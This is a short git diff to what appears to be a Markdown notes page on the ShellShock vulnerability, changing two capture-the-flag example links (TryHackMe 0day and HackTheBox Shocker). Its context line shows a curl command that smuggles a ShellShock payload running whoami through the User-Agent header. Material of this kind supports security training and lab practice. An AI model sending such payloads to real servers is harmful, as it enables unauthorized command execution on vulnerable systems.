@@ -27,7 +27,7 @@ curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://
 	```
 
 # Some Example
-- [TryHackMe 0day](https://youtu.be/TS_yfDqr_3s?t=1052)
-- HackTheBox Shocker - Initial Foothold via ShellShock
+- [TryHackMe 0day - Initial Foothold via ShellShock](https://youtu.be/TS_yfDqr_3s?t=1052)
+- [HackTheBox Shocker - Initial Foothold via ShellShock](https://yufongg.github.io/posts/Shocker/#tcp80-http---shell-shock)
 
 
